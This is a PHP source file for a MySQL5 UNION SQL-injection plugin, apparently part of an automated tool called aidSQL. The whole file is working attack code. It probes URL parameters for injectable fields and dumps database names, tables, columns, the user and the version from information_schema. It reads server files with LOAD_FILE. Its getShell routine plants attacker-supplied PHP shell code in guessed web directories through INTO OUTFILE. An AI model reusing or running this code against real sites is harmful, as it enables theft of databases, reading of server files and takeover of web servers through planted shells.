<?php

	namespace aidSQL\plugin\sqli {

		class MySQL5 extends InjectionPlugin {

			const		PLUGIN_NAME						= "UNION";
			const		PLUGIN_AUTHOR					= "Juan Stange";

			private	$_affectedDatabases			=	array("mysql");
			private	$_strRepeat						=	100;
			private	$_repeatCharacter				=	"a";
			private	$_fields							=	array();
			private	$_vulnerableIndex				=	0;
			private	$_fieldWrapping				=	NULL;
			private	$_groupConcatLength			=	NULL;


			public function injectionUnionWithConcat(){

				$queryBuilder	=	new \aidSQL\db\MySQLQueryBuilder();
				$this->setQueryBuilder($queryBuilder);

				$parser	=	new \aidSQL\parser\Generic();

				$openTag				=	"<aidsql>";
				$closeTag			=	"</aidsql>";

				$hexOpen				=	\String::hexEncode($openTag);
				$hexClose			=	\String::hexEncode($closeTag);

				$parser->setOpenTag($openTag);
				$parser->setCloseTag($closeTag);
				$parser->setLog($this->_logger);

				$this->setParser($parser);

				$offset	=	(isset($this->_config["start-offset"])) ? (int)$this->_config["start-offset"] : 1;

				if(!$offset){

					throw(new \Exception("Start offset should be an integer greater than 0!"));

				}

				$sqliParams	=	array(
					"space-char"		=>	" ",
					"field-payloads"	=>	explode('_',$this->_config["field-payloads"]),
					"ending-payloads"	=>	array(
						"comment"=>explode('_',$this->_config["comment-payloads"]),
						"order"=>array(
//							array("by"=>"1","sort"=>"DESC"),
//							array("by"=>"1","sort"=>"ASC"),
							array()
						),
						"limit"=>array(
							array()
	//						array("0","1"),
	//						array("1","1"),
						)
					)
				);


				if(array_key_exists("start-offset",$this->_config)){

					$offset	=	((int)$this->_config["start-offset"])	?	$this->_config["start-offset"]	:	1;

				}

				$this->detectUnionInjection($sqliParams,"unionQuery","CONCAT($hexOpen,%value%,$hexClose)",$offset);

				if(sizeof($this->_injection)){

					return TRUE;

				}

				return FALSE;

			}

			private function wrap($wrapping,$value){

				return preg_replace("/%value%/",$value,$wrapping);

			}

			private function wrapArray(Array $wrapMe,$wrapping){

				$return	=	array();

				foreach($wrapMe as $key=>$wrapIt){

					$return[]	=	$this->wrap($wrapping,$wrapIt);

				}

				return $return;

			}

			private function checkUnionInjectionParameters(Array &$sqliParams){

				if(!isset($sqliParams["field-payloads"])||!is_array($sqliParams["field-payloads"])){
					throw(new \Exception("Invalid field payloads!"));
				}

				if(!isset($sqliParams["ending-payloads"])||!is_array($sqliParams["ending-payloads"])){

					throw(new \Exception("Invalid ending payloads!"));

					if(!isset($sqliParams["comment"])||!is_array($sqliParams["comment"])){

						throw(new \Exception("Comment payloads key inside the ending-payloads array should be an array!"));

					}elseif(!isset($sqliParams["order"])){

						$sqliParams["order"]	=	array();

					}elseif(!isset($sqliParams["limit"])){

						$sqliParams["limit"]	=	array();

					}

				}

			}

			private function makeImpossibleValue($value){

				if(is_numeric($value)){
					return '9e99';
				}

				return md5(rand()*time());

			}

			private function detectUnionInjection(Array $sqliParams,$callback=NULL,$wrapping=NULL,$offset=1,$value=NULL){

				$this->checkUnionInjectionParameters($sqliParams);

				$requestVariables	=	$this->_httpAdapter->getUrl()->getQueryAsArray();

				foreach($requestVariables as $requestVariable=>$requestVariableValue){

					if($this->isIgnoredRequestVariable($requestVariable,$requestVariableValue)){
						continue;
					}

					$iterationContainer	=	array();

					if($offset>1){

						for($i=0;$i<$offset;$i++){
							$iterationContainer[]	=	$i;
						}

					}

					for($maxFields=$offset;$maxFields<=$this->_injectionAttempts;$maxFields++){

						$iterationContainer[]	=	(!empty($value))	?	$value	:	$maxFields;

						foreach($sqliParams["field-payloads"] as $payLoad){

							foreach($sqliParams["ending-payloads"]["comment"] as $comment) {

								foreach($sqliParams["ending-payloads"]["order"] as $order){

									foreach($sqliParams["ending-payloads"]["limit"] as $limit){

										if(!empty($wrapping)){
											$values	=	$this->wrapArray($iterationContainer,$wrapping);
										}else{
											$values	=	$iterationContainer;
										}

										$this->_queryBuilder->setCommentOpen($comment);
										$this->_queryBuilder->union($values,"ALL");

										if(sizeof($order)){

											$this->_queryBuilder->orderBy($order["by"],$order["sort"]);

										}

										if(sizeof($limit)){

											$this->_queryBuilder->limit($limit);

										}

										$space			=	$this->_queryBuilder->getSpaceCharacter();

										$madeUpValue	=	$this->makeImpossibleValue($requestVariableValue);

										$sql				=	$madeUpValue.$payLoad.
																$space.$this->_queryBuilder->getSQL().$comment;

										$this->_queryBuilder->setSQL($sql);

										$result	=	$this->query($requestVariable,$callback);

										if($result){

											foreach($requestVariables as $key=>$rV){
												if($key == $requestVariable){
													unset($requestVariables[$key]);
												}
											}

											$injectionParameters	=	array(
																				"index"						=>	$maxFields,	
																				"fieldValues"				=>	$iterationContainer,
																				"requestVariable"			=>	$requestVariable,
																				"requestValue"				=>	$madeUpValue,
																				"requestVariables"		=> $requestVariables,
																				"wrapping"					=>	$wrapping,
																				"payload"					=>	$payLoad,		//constant
																				"limit"						=>	$limit,			//variable 
																				"order"						=>	$order,			//variable
																				"comment"					=>	$comment,		//constant
																				"callback"					=>	$callback,
																				"affectedQueryField"		=> $result[0]
											);

											$this->setInjectionParameters($injectionParameters);

											$this->_payload	=	$payLoad;

											return TRUE;

										}

									}	//limit

								}	//order

							}	//comment

							$url	=	$this->_httpAdapter->getUrl();
							$url->addRequestVariable($requestVariable,$value); 
							$this->_httpAdapter->setUrl($url);

						}	//field-payload

					}	//maxfields

				}	//requestVariables

				return FALSE;

			}


			public function unionQuery($value,$from=NULL,Array $where=array(),Array $group=array()){

				$params	=	$this->_injection;

				foreach($params["fieldValues"] as $key=>&$val){

					//FIX ME
					if($val==$this->_injection["affectedQueryField"]){

						$val	=	$this->wrap($params["wrapping"],$value);	

					}

				}

				//$params["fieldValues"]	=	$this->wrapArray($params["fieldValues"],$params["wrapping"]);

				$this->_queryBuilder->union($params["fieldValues"],"ALL");

				if(!is_null($from)){
					$this->_queryBuilder->from($from);
				}

				if(sizeof($where)){
					$this->_queryBuilder->where($where);
				}

				if(sizeof($group)){
					$this->_queryBuilder->group($group);
				}

				if(isset($params["order"]["by"])){
					$this->_queryBuilder->orderBy($params["order"]["by"],$params["order"]["sort"]);
				}

				if(isset($params["limit"])){
					if(is_array($params["limit"])&&sizeof($params["limit"])){
						$this->_queryBuilder->limit($params["limit"]);
					}
				}

				$sql		=	$this->_queryBuilder->getSQL();
				$sql		=	$params["requestValue"].$params["payload"].$this->_queryBuilder->getSpaceCharacter().$sql.$params["comment"];

				$this->_queryBuilder->setSQL($sql);

				return parent::query($params["requestVariable"],__FUNCTION__);

			}

			public function getAffectedDatabases(){
				return $this->_affectedDatabases;
			}


			private function detectTruncatedData($string=NULL){

				if(strlen($string) == $this->_groupConcatLength){

					$this->log("Warning! Detected possibly truncated data!",2,"yellow");
					return TRUE;

				}

				return FALSE;
			
			}

			//GROUP_CONCAT is very efficient when you want to have a small footprint, however
			//some databases can be pretty massive, and the default length of characters brough by GROUP_CONCAT is 1024
			//in MySQL, in this way we make sure that the retrieved data has not been truncated. 
			//If it is we can take other action in order to get what we need.

			private function getGroupConcatLength(){

				if(!is_null($this->_groupConcatLength)){
					return $this->_groupConcatLength;
				}

				$this->log("Checking for @@group_concat_max_len",0,"light_cyan");

				$callback	=	$this->_injection["callback"];
				$length		=	$this->$callback("@@group_concat_max_len");

				$this->_groupConcatLength = $length[0];

				return $this->_groupConcatLength;

			}

			public function count($value,$from=NULL,Array $where=array(),Array $group=array(),$count=NULL){

				return $this->unionQuery("COUNT($value)",$from,$where,$group);
					
			}

			//Suppose you have detected truncated data, well, bad luck.
			//Hopefully we can count the registers and do a limit iteration	
			//through that :)

			public function unionQueryIterateLimit($value,$from=NULL,Array $where=array(),Array $group=array(),$count=NULL){

				if(is_null($count)){

					$count	=	$this->unionQuery("COUNT($value)",$from,$where,$group);
					$count	=	$count[0];
					$this->log("GOT REGISTRY COUNT = $count",0,"light_cyan");

				}

				if(isset($this->_injection["limit"])){
					$restoreLimit	=	$this->_injection["limit"];
				}

				$results			=	array();

				for($i=0;$i<=$count;$i++){

					$this->_injection["limit"]	=	array($i,1);
					$result			=	$this->unionQuery($value,$from,$where,$group);	
					$results[$i]	=	$result[0];

				}

				if(isset($this->_injection["limit"])&&isset($restoreLimit)){
					$this->_injection["limit"]	=	$restoreLimit;
				}

				return $results;

			}


			public function getSchemas(){

				if($this->_config["all"]["wanted-schemas"]=="none"){
					return FALSE;
				}

				$groupConcatLength	=	$this->getGroupConcatLength();

				$from						=	"information_schema.tables";
				$currentDatabase		=	$this->unionQuery("DATABASE()");
				$currentDatabase		=	$currentDatabase[0];

				switch($this->_config["all"]["wanted-schemas"]){

					case "{current}":
						$injection	=	NULL;
						$databases	=	$currentDatabase;
						break;

					case "{all}":

						$injection	=	"GROUP_CONCAT(DISTINCT(TABLE_SCHEMA))";

						//Here we use group concat in order to see if the injection can be achieved 
						//with little or no effort

						$databases				=	$this->unionQuery($injection,$from);
						$databases				=	$databases[0];

						break;

					default:

						$from			=	"GROUP_CONCAT(information_schema.tables)";
						$where		=	array("TABLE_SCHEMA","IN(",$this->_config["all"]["wanted-schemas"].')');

						//Here we use group concat in order to see if the injection can be achieved 
						//with little or no effort

						$databases				=	$this->unionQuery($injection,$from,$where);
						$databases				=	$databases[0];

						break;

				}


				//However if we detect that the data we fetched is truncated, we are forced 
				//to perform a few 10ths or 100ths of more queries :(

				if(!$injection&&$this->detectTruncatedData($databases)){

					$databases	=	$this->unionQueryIterateLimit($injection,$from);

				}else{

					$databases	=	explode(',',$databases);

				}

				$version					=	$this->getVersion();
				$version					=	$version[0];
				$user						=	$this->getUser();
				$user						=	$user[0];

				if(isset($this->_config["all"]["ommit-schemas"]) && !empty($this->_config["all"]["ommit-schemas"])){

					$ommitSchemas	=	explode(',',$this->_config["all"]["ommit-schemas"]);

				}

				foreach($databases as $database){

					$this->log("FOUND DATABASE $database",0,"light_purple");


					if(isset($ommitSchemas)){

						if(in_array($database,$ommitSchemas)){
							$this->log("Skipping fetching \"$database\" schema",0,"yellow");
							continue;
						}

					}

					$dbSchema	=	$this->getSingleSchema($database,$version,$user);

					if(!$dbSchema){

						$this->log("WARNING: Couldnt fetch database schema!",2,"yellow");

					}

					$this->addSchema($dbSchema);


				}

			}

			public function getSingleSchema($database,$version,$user){

				$groupConcatLength	=	$this->getGroupConcatLength();

				$dbSchema				=	new \aidSQL\core\DatabaseSchema();

				$dbSchema->setDbName($database);
				$dbSchema->setDbUser($user);
				$dbSchema->setDbVersion($version);
	
				$select	=	"TABLE_NAME,0x7c,TABLE_TYPE,0x7c,ENGINE,0x7c,TABLE_COLLATION,0x7c,IF(AUTO_INCREMENT,1,0)";
				$from		=	"information_schema.tables";

				$where	=	array("table_schema=".\String::hexEncode($database));

				$tables	=	$this->unionQuery("GROUP_CONCAT($select)",$from,$where);
				$tables	=	$tables[0];
				
			
				if($this->detectTruncatedData($tables)||!$tables){

					$count	=	$this->unionQuery("COUNT(TABLE_NAME)",$from,$where);	
					$count	=	$count[0]-1;
					//$select	=	substr($select,0,(strlen($separator)*-1));
					$tables	=	$this->unionQueryIterateLimit($select,$from,$where,array(),$count);

				}else{

					$tables	=	explode(',',$tables);

				}

				$retTables	=	array();

				foreach($tables as $table){

					$table						=	explode('|',$table);

					$tableName					=	$table[0];

					$tmpTable					=	array();

					$tmpTable["type"]			=	$table[1];
					$tmpTable["engine"]		=	$table[2];
					$tmpTable["collation"]	=	$table[3];
					$tmpTable["increment"]	=	$table[4];

					$columns	=	array();

					if($this->_config["all"]["schema"] == "complete"){

						$columns	=	$this->getColumns($tableName,$database);

					}

					$dbSchema->addTable($tableName,$tmpTable,$columns);

					$retTables[]	=	$table;

				}

				return $dbSchema;

			}
			

			public function getColumns($table=NULL,$database=NULL){

				if(is_null($table)){

					throw(new \Exception("ERROR: Table name cannot be empty when trying to fetch columns! (Please report bug)"));
					return array();

				}

				if(is_null($database)){

					throw(new \Exception("ERROR: Database name cannot be empty when trying to fetch columns! (Please report bug)"));
					return array();

				}

				$separator	=	",0x3f";

				$this->log("Fetching table \"$table\" columns ...",0,"white");

				$select							=	"COLUMN_NAME,0x7c,COLUMN_TYPE,0x7c,IF(COLUMN_KEY,COLUMN_KEY,0),0x7c,IF(EXTRA,EXTRA,0),0x7c,PRIVILEGES";
				$from								=	"information_schema.columns";

				$where							=	array(
																	"table_schema=".\String::hexEncode($database),
																	"AND",
																	"table_name=".\String::hexEncode($table)
														);

				$columns		=	$this->unionQuery("GROUP_CONCAT($select SEPARATOR 0x25)",$from,$where);	
				$columns		=	$columns[0];

				$retColumns	=	array();

				if($this->detectTruncatedData($columns)||!$columns){

					$count	=	$this->unionQuery("COUNT(COLUMN_NAME)",$from,$where);	
					$count	=	$count[0];

					//$select	=	substr($select,0,(strlen($separator)*-1));
					$columns =	$this->unionQueryIterateLimit($select,$from,$where,array(),$count);


				}else{

					$columns		=	explode('%',$columns);
					
				}

				foreach($columns as $column){

					if(empty($column)){
						continue;
					}

					$column							=	explode('|',$column);

					$tmpColName						=	(substr($column[0],0,1)==',')	?	substr($column[0],1)	:	$column[0];

					$tmpCol["type"]				=	$column[1];
					$tmpCol["key"]					=	$column[2];
					$tmpCol["extra"]				=	$column[3];
					$tmpCol["privilege"]			=	explode(',',$column[4]);

					$retColumns[$tmpColName]	=	$tmpCol;

				}

				return $retColumns;

			}

			public function getUser(){

				$callback	=	$this->_injection["callback"];
				return $this->$callback("USER()");

			}

			public function getVersion(){

				$callback	=	$this->_injection["callback"];
				return $this->$callback("@@version");
					
			}

			public function getDatadir(){

				$select	= "@@datadir";
				return $this->$callback($select);

			}

			public function isRoot($dbUser=NULL,\aidSQL\http\Adapter &$adapter=NULL){

				if(empty($dbUser)){
					throw(new \Exception("Database user passed was empty, cant check if its root or not!"));
				}

				if(!strpos($dbUser,"@")){
					throw (new \Exception("No @ found at database user!!!????"));
				}

				$user = substr($dbUser,0,strpos($dbUser,"@"));

				if(strtolower($user)=="root"){
					return TRUE;
				}

				$this->log("User is not root perse, looking up information_schema for file_priv",2,"yellow");

				//Check for the file privilege user permissions for writing
				//What it really takes to get a shell is the file writing privilege

				$filePrivilege	=	$this->checkPrivilege("file_priv",$dbUser);
				return $this->analyzeInjection($filePrivilege);

			}

			private function checkPrivilege($privilege,$user=NULL){

				$privilege			=	\String::hexEncode($privilege);
				$fieldInjection	=	"is_grantable";

				if(is_null($user)){

					$tableInjection	=	"FROM information_schema.user_privileges ".
					"WHERE privilege_type=0x66696c65 ".
					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX(USER(),0x40,1),0x27,0x40".
					",0x27,SUBSTRING_INDEX(USER(),0x40,-1),0x27)";

				}else{

					$user					=	\String::hexEncode($user);
					$tableInjection	=	"FROM information_schema.user_privileges ".
					"WHERE privilege_type=0x66696c65 ".
					"AND grantee=CONCAT(0x27,SUBSTRING_INDEX($user,0x40,1),0x27,0x40".
					",0x27,SUBSTRING_INDEX($user,0x40,-1),0x27)";

				}

				return $this->generateInjection($fieldInjection,$tableInjection);

			}

			public function loadFile($file=NULL){

				$select	=	"LOAD_FILE(".\String::hexEncode($file).')';	
				$from		=	"";
				return $this->generateInjection($select,$from);	

			}


			public function getShell(\aidSQL\core\PluginLoader &$pLoader,\aidSQL\http\crawler $crawler,Array $options){

				$restoreUrl				=	$this->_httpAdapter->getUrl();
				$shellCode				=	$this->_shellCode;

				$webDefaultsPlugin	=	$pLoader->getPluginInstance("info","defaults",$this->_httpAdapter,$this->_log);
				$information			=	$webDefaultsPlugin->getInfo();

				if (!is_a($information,"\\aidSQL\\plugin\\info\\InfoResult")){
					throw(new \Exception("Plugin $plugin[name] should return an instance of \\aidSQL\\plugin\\info\\InfoResult"));
				}

				$webDirectories	=	$information->getWebDirectories();
				
				foreach($crawler->getFiles() as $file=>$type){
	
					$path	=	dirname($file);

					if($path=='.'){
						continue;
					}

					if(!in_array($path,$webDirectories)){

						$this->log("Adding crawler path information: $path",0,"light_green",TRUE);
						array_unshift($webDirectories,$path);

					}

				}

				array_unshift($webDirectories,'');

				$unixDirectories		=	$information->getUnixDirectories();
				$winDirectories		=	$information->getWindowsDirectories();

				if(!sizeof($webDirectories)){

					$this->log("Web defaults Plugin failed to get a valid directory for injecting a shell :(",2,"red",TRUE);

				}

				$url	=	$this->_httpAdapter->getUrl();
				$host	=	$url->getHost();
				$url	=	$url->getScheme()."://$host";

				$fileName	=	$this->getShellName();

				foreach($webDirectories as $key=>$webDir){

					$webDir	=	trim($webDir,'/').'/';

					foreach($unixDirectories as $unixDir){
	
						$this->_httpAdapter->setUrl($restoreUrl);
			
						$unixDir					=	'/'.trim($unixDir,'/');
						$shellWebLocation		=	$url.'/'.$webDir.$fileName;

						$shellDirLocations	=	array();
						$shellDirLocations[]	=	$unixDir.'/'.$webDir.$fileName;
						$shellDirLocations[]	=	$unixDir.'/'.$host.'/'.$webDir.$fileName;

						if(preg_Match("#www\.#",$host)){
							$shellDirLocations[]	=	$unixDir.'/'.substr($host,strpos($host,'.')+1).'/'.$webDir.$fileName;
						}


						foreach($shellDirLocations as $shellDirLocation){

							$this->log("Trying to inject shell in \"$shellDirLocation\"",0,"white");
							$outFile		=	"INTO OUTFILE '$shellDirLocation'";

							$injection	=	$this->generateInjection($shellCode,$outFile);

							try{

								$this->analyzeInjection($injection,FALSE);

								$result			=	$this->analyzeInjection($this->loadFile($shellDirLocation));
								$decodedShell	=	\String::asciiEncode($shellCode);

								if($result!==FALSE&&sizeof($result)){

									if($result[0]==$decodedShell){
										return $shellWebLocation;
									}

								}
							
							}catch(\Exception $e){


							}

						}	

					}

				}


				return FALSE;

			}


			public static function getHelp(\aidSQL\core\Logger $logger){

				$logger->log("--sqli-mysql5-injection-attempts\tAt how many attempts shall we stop trying");
				$logger->log("--sqli-mysql5-start-offset\t\t<integer>Start the UNION injection at this offset (if you know what youre doing)");
				$logger->log("--sqli-mysql5-var-count\t\t<integer> Try this amount of variables per link");
				$logger->log("--sqli-numeric-only\t\t\tOnly try to perform injection on integer fields");
				$logger->log("--sqli-mysql5-strings-only\t\tOnly try to perform injection on string fields");
				$logger->log("--sqli-mysql5-field-payloads\t\tSet field payloads delimited by _\ti.e: _'_')_%)");
				$logger->log("--sqli-mysql5-ending-payloads\t\tSet ending payloads delimited by _\ti.e: LIMIT 1,1_ORDER BY 1");
				$logger->log("--sqli-mysql5-comment-payloads\t\tSet comment payloads delimited by _\ti.e: #_/*_--");
				$logger->log("--sqli-mysql5-shell-code\tPut your favorite shell code here i.e ".'<?php var_dump($_SERVER);?>');

			}

		}

	}
?>
